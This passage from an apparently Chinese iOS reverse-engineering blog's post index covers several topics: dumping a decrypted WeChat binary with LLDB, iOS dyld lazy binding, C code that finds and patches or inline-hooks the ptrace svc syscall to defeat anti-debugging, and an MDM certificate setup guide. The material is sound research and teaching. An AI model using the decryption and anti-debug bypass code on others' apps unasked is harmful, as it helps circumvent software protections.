x16, #0x14 0x181ceb58c &lt;+28&gt;: svc #0x80 Target 0: (WeChat) stopped. (lldb) xbr -E init [*] breakpoint at mod int first function:0x1034c7db8 Breakpoint 2: where = WeChat ___lldb_unnamed_symbol143521$$WeChat, address = 0x00000001034c7db8 (lldb) br disable 1 1 breakpoints disabled. (lldb) c Process 19633 resuming 这里解释一下为什么需要这么设置断点：b getpid这个断点主要是保证xbr -E init这个命令在断点触发的时候能够顺利执行，xbr -E init这个命令能够解析内存中的MachO格式找到mod_init_func然后对第一个init函数下断点，这样保证是目前app的最早执行时机，另外还能指定下断点到main函数xbr -E main，由于main函数在init之后，所以一般就对init下断点（有种情况在于app可能没有init函数，这时候就需要对main下断点，这里按实际情况处理）。这样下好断点以后，禁用或者删除第一个断点（第一个断点调用很频繁且后面不再需要），这样让程序继续执行，等待断点触发。 执行dumpdecrypted命令进行脱壳(lldb) dumpdecrypted [+] Dumping WeChat [+] detected 64bit ARM binary in memory. [+] offset to cryptid found: @0x100018d48(from 0x100018000) = d48 [+] Found encrypted data at address 00004000 of length 101662720 bytes - type 1. [+] Opening /private/var/containers/Bundle/Application/86E712C8-84CA-49AF-B2EA-01C37395A746/WeChat.app/WeChat for reading. [+] Reading header [+] Detecting header type [+] Executable is a plain MACH-O image [+] Opening /var/mobile/Containers/Data/Application/9649276C-C413-4916-B5AB-AE13C8D7B652/Documents/WeChat.decrypted for writing. [+] Copying the not encrypted start of the file [+] Dumping the decrypted data into the file [+] Copying the not encrypted remainder of the file [+] Setting the LC_ENCRYPTION_INFO-&gt;cryptid to 0 at offset d48 [+] Closing original file [+] Closing dump file [*] This mach-o file decrypted done. Developed By xia0@2019 如果一切顺利，就能顺利完成脱壳，这里目标文件在 /var/mobile/Containers/Data/Application/9649276C-C413-4916-B5AB-AE13C8D7B652/Documents/WeChat.decrypted 取回脱壳后的文件到本地，这里用到了issh一条命令取回xia0 ~ $ issh scp /var/mobile/Containers/Data/Application/9649276C-C413-4916-B5AB-AE13C8D7B652/Documents/WeChat.decrypted /tmp [*]:iproxy process for 2222 port alive, pid=1830 [*]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++ [*]:/var/mobile/Containers/Data/Application/9649276C-C413-4916-B5AB-AE13C8D7B652/Documents/WeChat.decrypted is remote file, so cp it from device WeChat.decrypted 100% 122MB 11.7MB/s 00:10 其他注意事项目标App文件过大，可能会出现加密段会有内存读取错误，解决办法就是手动在LLDB里面读取一下这个段内容，然后再执行就没问题了。 用到两个工具： https://github.com/4ch12dy/issh https://github.com/4ch12dy/xia0LLDB 参考 https://github.com/stefanesser/dumpdecrypted https://github.com/AloneMonkey/dumpdecrypted","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"lldb","slug":"lldb","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/lldb/"}]},{"title":"深入理解iOS动态链接","date":"2019-09-14T00:12:55.000Z","path":"2019/09/14/iOS-dyld-dynamic-link/iOS-dyld-dynamic-link/","text":"深入理解iOS动态链接 本文将通过objc_msgsend来介绍iOS平台上面的动态链接 开始动态链接有很多好处这里就不再叙述，本文主要分析动态链接一些平时忽略的细节。在2年前写过macho动态链接文章去分析过动态链接相关，但是之前分析得平台是x64的mac平台，而且分析得并不是很详细。由于需要对这块知识有一个比较深刻的理解，分析了在iOS平台动态链接的一些细节。本文就是我在分析过程中的一些心得和理解，希望能够有所帮组。 外部符号调用过程这里以objc_msgsend这个常见的符号为例，首先我们在ida中找到该符号的桩代码 __stubs:000000010000A2E8 ; void *objc_msgSend(void *, const char *, ...) __stubs:000000010000A2E8 _objc_msgSend __stubs:000000010000A2E8 __stubs:000000010000A2E8 NOP __stubs:000000010000A2EC LDR X16, =__imp__objc_msgSend __stubs:000000010000A2F0 BR X16 ; __imp__objc_msgSend 可以看出仅仅是一个跳转，由于ida这里识别出来为一个外部符号，所以生成了一个imp段，实际上跳转的地址并不是__imp__objc_msgSend，所以我们在调试器中跟一下 Process 6478 stopped * thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step into frame #0: 0x000000010000a3e4 TestAPP -&gt; 0x10000a3e4: ldr w16, 0x10000a3ec 0x10000a3e8: b 0x10000a384 0x10000a3ec: .long 0x00000246 ; unknown opcode 0x10000a3f0: ldr w16, 0x10000a3f8 0x10000a3f4: b 0x10000a384 0x10000a3f8: .long 0x0000025b ; unknown opcode 0x10000a3fc: ldr w16, 0x10000a404 0x10000a400: b 0x10000a384 发现跳转到了0x10000a3e4地址，在ida中查看该地址发现在stub_helper这个区 __stub_helper:000000010000A3E4 LDR W16, =0x246 __stub_helper:000000010000A3E8 B loc_10000A384 __stub_helper:000000010000A3EC dword_10000A3EC DCD 0x246 下面就会跳转到loc_10000A384其实所有的外部符号第一次调用的时候都会跳到这里进行符号绑定，还需要说明的一点在于，这里会将一个数加载到w16这个寄存器之中。这个数事实上和后面的符号绑定相关 __stub_helper:000000010000A384 ; Segment type: Pure code __stub_helper:000000010000A384 AREA __stub_helper, CODE, READWRITE __stub_helper:000000010000A384 ; ORG 0x10000A384 __stub_helper:000000010000A384 CODE64 __stub_helper:000000010000A384 ADR X17, off_10000C030 __stub_helper:000000010000A388 NOP __stub_helper:000000010000A38C STP X16, X17, [SP,#-0x10]! __stub_helper:000000010000A390 NOP __stub_helper:000000010000A394 LDR X16, =dyld_stub_binder __stub_helper:000000010000A398 BR X16 ; dyld_stub_binder 随后就会调用dyld_stub_binder函数进行符号绑定，这也是一个外部符号。当然你可能会说这样的话不就死循环了吗？其实不是，这个符号并不是lazy的即在初始化过程中就确定了地址。这里dyld_stub_binder的代码如下 libdyld.dylib`dyld_stub_binder: -&gt; 0x181bccb64 &lt;+0&gt;: stp x29, x30, [sp, #-0x10]! 0x181bccb68 &lt;+4&gt;: mov x29, sp 0x181bccb6c &lt;+8&gt;: sub sp, sp, #0xf0 ; =0xf0 0x181bccb70 &lt;+12&gt;: stp x0, x1, [x29, #-0x10] 0x181bccb74 &lt;+16&gt;: stp x2, x3, [x29, #-0x20] 0x181bccb78 &lt;+20&gt;: stp x4, x5, [x29, #-0x30] 0x181bccb7c &lt;+24&gt;: stp x6, x7, [x29, #-0x40] 0x181bccb80 &lt;+28&gt;: stp x8, x9, [x29, #-0x50] 0x181bccb84 &lt;+32&gt;: stp q0, q1, [x29, #-0x80] 0x181bccb88 &lt;+36&gt;: stp q2, q3, [x29, #-0xa0] 0x181bccb8c &lt;+40&gt;: stp q4, q5, [x29, #-0xc0] 0x181bccb90 &lt;+44&gt;: stp q6, q7, [x29, #-0xe0] 0x181bccb94 &lt;+48&gt;: ldr x0, [x29, #0x18] 0x181bccb98 &lt;+52&gt;: ldr x1, [x29, #0x10] 0x181bccb9c &lt;+56&gt;: bl 0x181bcd8b8 ; _dyld_fast_stub_entry(void*, long) 0x181bccba0 &lt;+60&gt;: mov x16, x0 0x181bccba4 &lt;+64&gt;: ldp x0, x1, [x29, #-0x10] 0x181bccba8 &lt;+68&gt;: ldp x2, x3, [x29, #-0x20] 0x181bccbac &lt;+72&gt;: ldp x4, x5, [x29, #-0x30] 0x181bccbb0 &lt;+76&gt;: ldp x6, x7, [x29, #-0x40] 0x181bccbb4 &lt;+80&gt;: ldp x8, x9, [x29, #-0x50] 0x181bccbb8 &lt;+84&gt;: ldp q0, q1, [x29, #-0x80] 0x181bccbbc &lt;+88&gt;: ldp q2, q3, [x29, #-0xa0] 0x181bccbc0 &lt;+92&gt;: ldp q4, q5, [x29, #-0xc0] 0x181bccbc4 &lt;+96&gt;: ldp q6, q7, [x29, #-0xe0] 0x181bccbc8 &lt;+100&gt;: mov sp, x29 0x181bccbcc &lt;+104&gt;: ldp x29, x30, [sp], #0x10 0x181bccbd0 &lt;+108&gt;: add sp, sp, #0x10 ; =0x10 0x181bccbd4 &lt;+112&gt;: br x16 然后调用了_dyld_fast_stub_entry函数，由于dyld本身开源的，这里下载源码去看下这个函数的实现 uintptr_t fastBindLazySymbol(ImageLoader** imageLoaderCache, uintptr_t lazyBindingInfoOffset) { uintptr_t result = 0; // get image if ( *imageLoaderCache == NULL ) { // save in cache *imageLoaderCache = dyld::findMappedRange((uintptr_t)imageLoaderCache); if ( *imageLoaderCache == NULL ) { const char* message = &quot;fast lazy binding from unknown image&quot;; dyld::log(&quot;dyld: %s\\n&quot;, message); halt(message); } } // bind lazy pointer and return it try { result = (*imageLoaderCache)-&gt;doBindFastLazySymbol((uint32_t)lazyBindingInfoOffset, gLinkContext, (dyld::gLibSystemHelpers != NULL) ? dyld::gLibSystemHelpers-&gt;acquireGlobalDyldLock : NULL, (dyld::gLibSystemHelpers != NULL) ? dyld::gLibSystemHelpers-&gt;releaseGlobalDyldLock : NULL); } catch (const char* message) { dyld::log(&quot;dyld: lazy symbol binding failed: %s\\n&quot;, message); halt(message); } // return target address to glue which jumps to it with real parameters restored return result; } 然后这里调用了ImageLoaderMachOCompressed::doBindFastLazySymbol去完成符号绑定 uintptr_t ImageLoaderMachOCompressed::doBindFastLazySymbol(uint32_t lazyBindingInfoOffset, const LinkContext&amp; context, void (*lock)(), void (*unlock)()) { // &lt;rdar://problem/8663923&gt; race condition with flat-namespace lazy binding if ( this-&gt;usesTwoLevelNameSpace() ) { // two-level namespace lookup does not require lock because dependents can&#39;t be unloaded before this image } else { // acquire dyld global lock if ( lock != NULL ) lock(); } const uint8_t* const start = fLinkEditBase + fDyldInfo-&gt;lazy_bind_off; const uint8_t* const end = &amp;start[fDyldInfo-&gt;lazy_bind_size]; if ( lazyBindingInfoOffset &gt; fDyldInfo-&gt;lazy_bind_size ) { dyld::throwf(&quot;fast lazy bind offset out of range (%u, max=%u) in image %s&quot;, lazyBindingInfoOffset, fDyldInfo-&gt;lazy_bind_size, this-&gt;getPath()); } uint8_t type = BIND_TYPE_POINTER; uintptr_t address = 0; const char* symbolName = NULL; uint8_t symboFlags = 0; long libraryOrdinal = 0; bool done = false; uintptr_t result = 0; const uint8_t* p = &amp;start[lazyBindingInfoOffset]; while ( !done &amp;&amp; (p &lt; end) ) { uint8_t immediate = *p &amp; BIND_IMMEDIATE_MASK; uint8_t opcode = *p &amp; BIND_OPCODE_MASK; ++p; switch (opcode) { case BIND_OPCODE_DONE: done = true; break; case BIND_OPCODE_SET_DYLIB_ORDINAL_IMM: libraryOrdinal = immediate; break; case BIND_OPCODE_SET_DYLIB_ORDINAL_ULEB: libraryOrdinal = read_uleb128(p, end); break; case BIND_OPCODE_SET_DYLIB_SPECIAL_IMM: // the special ordinals are negative numbers if ( immediate == 0 ) libraryOrdinal = 0; else { int8_t signExtended = BIND_OPCODE_MASK | immediate; libraryOrdinal = signExtended; } break; case BIND_OPCODE_SET_SYMBOL_TRAILING_FLAGS_IMM: symbolName = (char*)p; symboFlags = immediate; while (*p != &#39;\\0&#39;) ++p; ++p; break; case BIND_OPCODE_SET_TYPE_IMM: type = immediate; break; case BIND_OPCODE_SET_SEGMENT_AND_OFFSET_ULEB: if ( immediate &gt;= fSegmentsCount ) dyld::throwf(&quot;BIND_OPCODE_SET_SEGMENT_AND_OFFSET_ULEB has segment %d which is too large (0..%d)&quot;, immediate, fSegmentsCount-1); address = segActualLoadAddress(immediate) + read_uleb128(p, end); break; case BIND_OPCODE_DO_BIND: result = this-&gt;bindAt(context, address, type, symbolName, 0, 0, libraryOrdinal, &quot;lazy &quot;, NULL, true); break; case BIND_OPCODE_SET_ADDEND_SLEB: case BIND_OPCODE_ADD_ADDR_ULEB: case BIND_OPCODE_DO_BIND_ADD_ADDR_ULEB: case BIND_OPCODE_DO_BIND_ADD_ADDR_IMM_SCALED: case BIND_OPCODE_DO_BIND_ULEB_TIMES_SKIPPING_ULEB: default: dyld::throwf(&quot;bad lazy bind opcode %d&quot;, *p); } } if ( !this-&gt;usesTwoLevelNameSpace() ) { // release dyld global lock if ( unlock != NULL ) unlock(); } return result; } 这里面有个十分熟悉但之前都没去深入研究的一个东西，即__LINKEDIT段。这里可以看出用用到这个段里面的一个数据去完成符号绑定。之前仅仅是知道这个段用作符号绑定，现在终于知道了原来就是这里用到了这个段的信息。这里先不去解释其中的opcode含义，关于这块的知识可以看这里DYLD Detailed。调试看下下一次调用时候，会不会直接返回绑定后的地址 TestAPP`objc_msgSend: -&gt; 0x10000a2e8 &lt;+0&gt;: nop 0x10000a2ec &lt;+4&gt;: ldr x16, #0x1e1c ; (void *)0x00000001817c9b80: objc_msgSend 0x10000a2f0 &lt;+8&gt;: br x16 从这里就能看出已经找到了objc_msgSend符号的地址 (lldb) p/x 0x10000a2ec+0x1e1c (long) $9 = 0x000000010000c108 (lldb) x/g 0x000000010000c108 0x10000c108: 0x00000001817c9b80 那么这里的0x000000010000c108地址在macho文件在是什么地址呢？这里其实是一个指针，保存了外部符号的地址。这个地址在__DATA,__la_symbol_ptr这个区之中。初始值是__TEXT,__stub_helper中的某个地址。 外部符号调用总结上面的过程有一点绕，这里从宏哥来解释下整个过程 程序调用一个外部符号（objc_msgsend）这里就是-[AppDelegate class]方法 __text:0000000100008C34 LDR X30, [X30] ; _OBJC_CLASS_$_AppDelegate __text:0000000100008C38 LDR X1, [X1] ; &quot;class&quot; __text:0000000100008C3C STR X0, [SP,#0x30+var_18] __text:0000000100008C40 MOV X0, X30 ; void * __text:0000000100008C44 STR W8, [SP,#0x30+var_1C] __text:0000000100008C48 STR X9, [SP,#0x30+var_28] __text:0000000100008C4C BL _objc_msgSend 然后跳转到__TEXT, __stubs这个区 __stubs:000000010000A2E8 _objc_msgSend __stubs:000000010000A2E8 __stubs:000000010000A2E8 NOP __stubs:000000010000A2EC LDR X16, =__imp__objc_msgSend __stubs:000000010000A2F0 BR X16 这里x16寄存器的默认值就是objc_msgSend在__TEXT,__stub_helper中对应的地址 __stub_helper:000000010000A3E4 LDR W16, =0x246 __stub_helper:000000010000A3E8 B loc_10000A384 __stub_helper:000000010000A3EC dword_10000A3EC DCD 0x246 接着就是去调用dyld_stub_binder函数进行符号绑定，第一次找到该符号地址以后直接返回给调用处，并且将__DATA,__la_symbol_ptr中objc_msgSend的指针值更改为找到的符号地址。这样下一次就不会跳转到__TEXT,__stub_helper里面，而是直接跳转到正确的函数地址。 __stub_helper:000000010000A384 ; Segment type: Pure code __stub_helper:000000010000A384 AREA __stub_helper, CODE, READWRITE __stub_helper:000000010000A384 ; ORG 0x10000A384 __stub_helper:000000010000A384 CODE64 __stub_helper:000000010000A384 ADR X17, off_10000C030 __stub_helper:000000010000A388 NOP __stub_helper:000000010000A38C STP X16, X17, [SP,#-0x10]! __stub_helper:000000010000A390 NOP __stub_helper:000000010000A394 LDR X16, =dyld_stub_binder __stub_helper:000000010000A398 BR X16 ; dyld_stub_binder 最后一个函数符号的地址绑定就完成了 参考 http://www.newosxbook.com/articles/DYLD.html#footnote https://github.com/opensource-apple/dyld https://github.com/gdbinit/MachOView https://blog.gocy.tech/2018/08/01/behindthescenes-symbol-resolve/ https://blog.gocy.tech/2019/07/08/hook-msgSend-advance/","tags":[{"name":"iOS","slug":"iOS","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iOS/"},{"name":"wiki","slug":"wiki","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/wiki/"}]},{"title":"iOS微信快速备注好友插件分析与实现","date":"2019-09-11T09:31:37.000Z","path":"2019/09/11/appre-wechat-rename/appre-wechat-rename/","text":"Need password to decrypt! Incorrect Password! No content to display! ","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"tweak","slug":"tweak","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tweak/"}]},{"title":"iOS inlinehook绕过反调试","date":"2019-09-10T08:02:54.000Z","path":"2019/09/10/anti-anti-debug-pro/anti-anti-debug-pro/","text":"iOS inlinehook绕过反调试开始之前写过一篇iOS LLDB中基于内存单指令patch实现反反调试介绍了在LLDB中如何通过单指令patch的方式去绕过ptrace来反调试。但后面还有一些情况没有解决：如果不是调用ptrace函数，而是直接编写内联汇编的方式，调用对应的系统调用来间接实现反调试，那么这种方式之前的那种办法就不再可行。本文就准备解决那种用内联汇编的反调试方式。 两种绕过方案这里有两种方案去绕过这种反调试： 静态内存匹配特征patch 实现一个简单的inlinehook动态hook绕过 静态内存匹配特征patch在介绍思路之前，先看下一遍内联汇编去实现反调试的代码 asm volatile( &quot;mov x0,#31\\n&quot; &quot;mov x1,#0\\n&quot; &quot;mov x2,#0\\n&quot; &quot;mov x3,#0\\n&quot; &quot;mov x16,#26\\n&quot; &quot;svc #128\\n&quot; ); 这里可以看出原理就是调用了26号系统调用，那么我们是不是可以去代码段里面去搜索，找到满足该特征的代码位置，然后直接将svc置为 nop不就可以了？下面引出两个问题，如何去遍历代码段以及如何去修改？ 获取代码段位置以及大小void getTextSegmentAddr(struct segmentRange *textSegRange){ int offset = 0; struct mach_header_64* header = (struct mach_header_64*)_dyld_get_image_header(0); if(header-&gt;magic != MH_MAGIC_64) { return ; } offset = sizeof(struct mach_header_64); int ncmds = header-&gt;ncmds; while(ncmds--) { /* go through all load command to find __TEXT segment*/ struct load_command * lcp = (struct load_command *)((uint8_t*)header + offset); offset += lcp-&gt;cmdsize; if(lcp-&gt;cmd == LC_SEGMENT_64) { struct segment_command_64 * curSegment = (struct segment_command_64 *)lcp; struct section_64* curSection = (struct section_64*)((uint8_t*)curSegment + sizeof(struct segment_command_64)); // check current section of segment is __TEXT? if(!strcmp(curSection-&gt;segname, &quot;__TEXT&quot;) &amp;&amp; !strcmp(curSection-&gt;sectname, &quot;__text&quot;)){ uint64_t memAddr = curSection-&gt;addr; textSegRange-&gt;start = memAddr + _dyld_get_image_vmaddr_slide(0); textSegRange-&gt;end = textSegRange-&gt;start + curSection-&gt;size; break; } } } return ; } 代码不复杂，就是动态解析了自身内存里面的macho文件，根据macho文件格式找到代码段LC_SEGMENT_64(_TEXT)然后就能得到__text的开始位置以及大小。 内存搜索匹配ptrace内联汇编代码void* lookup_ptrace_svc(void* target_addr, uint64_t size){ uint8_t * p = (uint8_t*)target_addr; for(int i = 0; i &lt; size ;i++ ){ /* mov x16, #0x1a -&gt; 0xd2800350 svc #0x80 -&gt; 0xd4001001 */ if (*((uint32_t*)p) == 0xd2800350 &amp;&amp; *((uint32_t*)p+1) == 0xd4001001) { return p; } p++; } return NULL; } 传入的就是代码段的地址以及大小，然后遍历整个代码段，找到满足以下ptrace特征汇编代码 mov x16, #0x1a -&gt; 0xd2800350 svc #0x80 -&gt; 0xd4001001 然后就返回该地址。 patch代码（将svc改为nop）iOS LLDB中基于内存单指令patch实现反反调试这篇文章介绍了如何去patch代码的原理，但当时遇到一个bug：在iOS11/12上面patch会失败，后面我花了一段时间去分析了失败的原因，后来也写了一篇文章去记录了分析的过程，感兴趣的可以访问iOS12内存patch remap bug分析 这里我就直接给出patch的代码 uint8_t patch_ins_data[4] = {0x1f, 0x20, 0x03, 0xd5}; // nop patchCode(ptrace_svc_p+4, patch_ins_data , 4); 完整流程代码如下 - (void)kill_anti_debug{ struct segmentRange textSegRange; getTextSegmentAddr(&amp;textSegRange); void* ptrace_svc_p = lookup_ptrace_svc((void*)textSegRange.start, textSegRange.end-textSegRange.start); if (!ptrace_svc_p) { ADDLOG(@&quot;[-] not found ptrace svc&quot;); return; } ADDXLOG(@&quot;[+] found ptrace svc # address=%p&quot;, ptrace_svc_p); char* ptrace_bytes = hex_dump((void*)ptrace_svc_p, 8); ADDXLOG(@&quot;[+] read ptrace svc ins address:%p size:0x%x inst_bytes:%s&quot;, ptrace_svc_p, 8, ptrace_bytes); free(ptrace_bytes); ADDLOG(@&quot;[*] start to ptach ptrace svc to ret&quot;); uint8_t patch_ins_data[4] = {0x1f, 0x20, 0x03, 0xd5}; patchCode(ptrace_svc_p+4, patch_ins_data , 4); ADDLOG(@&quot;[*] ptach ptrace svc to nop done, read new value&quot;); ptrace_bytes = hex_dump((void*)ptrace_svc_p, 8); ADDXLOG(@&quot;[+] read ptrace svc ins address:%p size:0x%x inst_bytes:%s&quot;, ptrace_svc_p, 8, ptrace_bytes); free(ptrace_bytes); } 通过比对前后的代码就发现svc出地址的代码已经变成了nop从而绕过了反调试 inlinehook动态hook绕过这种方式主要针对那些混淆了系统调用号或者其他编译版本，其绕过原理是直接hook svc指令，然后判断是否为26号系统调用（让其他系统调用正常执行），若满足就直接跳过svc指令。 整体流程代码如下 struct segmentRange textSegRange; getTextSegmentAddr(&amp;textSegRange); void* svc_p = lookup_svc_ins((void*)textSegRange.start, textSegRange.end-textSegRange.start); if (!svc_p) { ADDLOG(@&quot;[-] not found svc&quot;); return; } ADDXLOG(@&quot;[+] found svc # address=%p&quot;, svc_p); char* svc_bytes = hex_dump((void*)svc_p, 4); ADDXLOG(@&quot;[+] read ptrace svc ins address:%p size:0x%x inst_bytes:%s&quot;, svc_p, 4, svc_bytes); free(svc_bytes); xia0Hook(svc_p); 同样遍历代码段找到所有的svc指令，然后进行hook，下面看hook的具体实现 bool xia0Hook(void* target_addr){ int len = (int)sysconf(_SC_PAGESIZE); // 1. get target address page and patch offset unsigned long page_start = (unsigned long) (target_addr) &amp; ~PAGE_MASK; unsigned long patch_offset = (unsigned long)target_addr - page_start; printf(&quot;[*] Target address:%p Page start:%p Patch offset:%p&quot;, target_addr, (void*)page_start, (void*)patch_offset); // 2. map new page for patch void *new = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0); if (!new ){ printf(&quot;[-] mmap failed!&quot;); return false; } // 3.copy target 4 ins to new page int copy_size = 4*4; void* copy_from_addr = target_addr - copy_size; memcpy((void *)(new), copy_from_addr, copy_size); /* cmp x16, #0x1a b.ne loc_not_ptrace_svc_jmp ldr x17, #0x8 br x17 orig_svc_next_addr_1 orig_svc_next_addr_2 ldr x17, #0x8 br x17 orig_svc_addr_1 orig_svc_addr_2 */ uint64_t orig_svc_addr = (uint64_t)target_addr; uint64_t orig_svc_next_addr = (uint64_t)(target_addr+1*4); uint8_t check_jmp_data[] = {0x1f, 0x6a, 0x00, 0xf1, 0x51, 0x00, 0x00, 0x58, 0x20, 0x02, 0x1f, 0xd6, orig_svc_next_addr&amp;0xff, (orig_svc_next_addr&gt;&gt;8*1)&amp;0xff, (orig_svc_next_addr&gt;&gt;8*2)&amp;0xff, (orig_svc_next_addr&gt;&gt;8*3)&amp;0xff, (orig_svc_next_addr&gt;&gt;8*4)&amp;0xff, (orig_svc_next_addr&gt;&gt;8*5)&amp;0xff, (orig_svc_next_addr&gt;&gt;8*6)&amp;0xff, (orig_svc_next_addr&gt;&gt;8*7)&amp;0xff, 0x51, 0x00, 0x00, 0x58, 0x20, 0x02, 0x1f, 0xd6, orig_svc_addr&amp;0xff, (orig_svc_addr&gt;&gt;8*1)&amp;0xff, (orig_svc_addr&gt;&gt;8*2)&amp;0xff, (orig_svc_addr&gt;&gt;8*3)&amp;0xff, (orig_svc_addr&gt;&gt;8*4)&amp;0xff, (orig_svc_addr&gt;&gt;8*5)&amp;0xff, (orig_svc_addr&gt;&gt;8*6)&amp;0xff, (orig_svc_addr&gt;&gt;8*7)&amp;0xff}; int check_jmp_data_size = 10*4; memcpy((void *)(new+4*4), check_jmp_data, check_jmp_data_size); // 4.patch target address to jmp hook code void* patch_addr = copy_from_addr; uint64_t new_p = (uint64_t)new; /* ldr x16, #0x8 br x16 hook_code_addr_1 hook_code_addr_2 */ uint8_t patch_data[] = {0x50, 0x00, 0x00, 0x58, 0x00, 0x02, 0x1f, 0xd6,new_p&amp;0xff, (new_p&gt;&gt;8*1)&amp;0xff, (new_p&gt;&gt;8*2)&amp;0xff, (new_p&gt;&gt;8*3)&amp;0xff, (new_p&gt;&gt;8*4)&amp;0xff, (new_p&gt;&gt;8*5)&amp;0xff, (new_p&gt;&gt;8*6)&amp;0xff, (new_p&gt;&gt;8*7)&amp;0xff}; int patch_data_size = 4*4; patchCode(patch_addr, patch_data, patch_data_size); // 5. set new page to r-x mprotect(new, len, PROT_READ | PROT_EXEC); return true; } 这里代码比较复杂，大致分为以下步骤 map一页内存new，后面会将hook的代码写到里面 copy原svc前的四条指令保存到new页（目前没有进行相对寻址修复） 将hook判断的代码写到紧接着前面四条指令的后面，汇编代码大致如下 cmp x16, #0x1a b.ne loc_not_ptrace_svc_jmp ldr x17, #0x8 br x17 orig_svc_next_addr_1 orig_svc_next_addr_2 ldr x17, #0x8 br x17 orig_svc_addr_1 orig_svc_addr_2 就是简单的判断了系统调用号是否为26，若满足就跳到svc的下一条指令，若不是则跳回原svc指令以保证其他系统调用正常执行。 patch目标地址进行hook跳转，由于进行任意地址跳转需要4条指令大小，所以这里覆盖了svc前的四条指令 ldr x16, #0x8 br x16 hook_code_addr_1 hook_code_addr_2 这里就是在执行svc指令前使其跳转到我们的hook代码 最后将new这页设置为可读不可写可执行的页属性 总结/Todo其实对于这种inlinehook去绕过调试，后面发现已经有人已经实现了，因为只要实现了inlinehook，肯定能hook代码绕过。不过我这里主要是想去自己分析以及实现这里面的很多细节。因为hook框架由于要考虑到稳定，兼容等等因素，所以往往代码不是很直接。而这里通过仅仅实现绕过反调试的需求，所以代码都比较通俗易懂，原理来说都是一样的。只有自己去动手写了代码才发现里面的乐趣所在，比如如何去实现系统调用的判断？如何解决寄存器污染?如何去实现代码段patch？当然还有很多汇编级别的坑存在，踩坑解决坑同样有意思，这里就不一一介绍。 后面主要还有两个事需要做： 相对寻址指令的修复问题，以及hook代码的稳定兼容扩展问题。 抽离相关代码，集成到xia0LLDB之中，真正实现调试器中一键绕过反调试。 参考 https://stackoverflow.com/questions/25286221/how-to-find-text-segment-range-in-ios https://github.com/coolstar/substitute http://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E8%B0%83%E8%AF%95%E5%8F%8A%E7%BB%95%E8%BF%87/ http://4ch12dy.site/2019/08/16/iOS12-remap-bug-analyze/iOS12-remap-bug-analyze/ http://4ch12dy.site/2019/08/12/xia0lldb-anti-anti-debug/xia0lldb-anti-anti-debug/","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"debug","slug":"debug","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/debug/"},{"name":"hook","slug":"hook","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/hook/"}]},{"title":"iOS MDM搭建实践指南","date":"2019-09-02T04:03:24.000Z","path":"2019/09/02/introduce-MDM-in-iOS/introduce-MDM-in-iOS/","text":"iOS MDM搭建实践指南 本文只介绍在iOS平台搭建MDM相关 开始MDM全称是移动设备管理，方便企业对员工的移动设备管理。在iOS中同样支持MDM功能，本文就介绍如何搭建MDM整个架构。实际上在2018年的时候我通过翻阅为数不多的资料，经过一番折腾才最终走通了整个流程。然而当时过于激动并没有写相关文档记录，经过一年没想到签名证书过期了，却忘记了整个搭建流程。于是重新回顾了一下，所以这次记录下整个过程，希望对后面的人有所帮助。 整体流程 获取Vendor p12证书 制作服务端推送证书 生成并签名设备描述文件 MDM通信指令结构及原理分析 企业MDM最佳方案 获取Vendor p12证书 制作MDM Vendor CSR 1、打开钥匙串 2、选择钥匙串访问-&gt;证书助理-&gt;从证书颁发机构请求证书 3、填写相关信息 4 、保存在本地 上传CSR文件到Apple 访问https://developer.apple.com/account/ios/certificate/create页面 将CSR文件上传到页面，等待1-2个工作日。 这时候你下载.cer文件，保存为mdmvendor.cer 导出MDM私钥 在钥匙串中打开mdmvendor.cer文件，然后右键选择导出并保存为private.p12文件 注意：这里生成的文件很重要，建议新建一个MDM目录保存 制作服务端推送证书生成证书签名请求文件 选择钥匙串访问-&gt;证书助理-&gt;从证书颁发机构请求证书 输入邮箱，姓名等信息 保存到本地为push.csr 导出MDM私钥和Vendor证书 取出私钥 执行下面的命令会要求输入private.p12的密码 openssl pkcs12 -in private.p12 -nocerts -out key.pem 去掉private.p12密码 openssl rsa -in key.pem -out private.key 取出证书文件 执行下面的命令会要求输入private.p12的密码 openssl pkcs12 -in private.p12 -clcerts -nokeys -out cert.pem 转为DES加密 openssl x509 -in cert.pem -inform PEM -out mdm.cer -outform DES 用mdmvendorsign工具生成applepush.csr我们需要mdmvendorsign工具中的/vendor/的相关代码文件，这里将上面的private.key, push.csr, 以及mdm.cer文件都复制到/vendor/目录。然后执行下面的命令 python mdm_vendor_sign.py --key private.key --csr push.csr --mdm mdm.cer --out applepush.csr 从apple获取推送证书将上面生成的applepush.csr文件上传到Apple’s Push Certificates Portal 然后下载推送证书，下载回来的证书在钥匙串中打开，你会看到以下信息 其中用户ID需要保存下来，后面会用到。并右键导出p12私钥。存为mdm.p12 将导出的p12私钥用下面命令生成服务器推送证书 openssl pkcs12 -in mdm.p12 -out PushCert.pem -nodes 然后将PushCert.pem拷贝到./Apple-iOS-MDM-Server/scripts/目录 生成并签名设备描述文件生成设备描述文件 用这个软件来制作Apple Configurator 2描述文件，但是现在新版本不支持直接生产MDM的描述文件，只能先做一个通用的描述文件，然后再增加MDM相关的字段。 生成的大概模板如下： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt; &lt;plist version=&quot;1.0&quot;&gt; &lt;dict&gt; &lt;key&gt;ConsentText&lt;/key&gt; &lt;dict&gt; &lt;key&gt;default&lt;/key&gt; &lt;string&gt;install to enble DiDi manage your device&lt;/string&gt; &lt;/dict&gt; &lt;key&gt;PayloadContent&lt;/key&gt; &lt;array&gt; &lt;dict&gt; 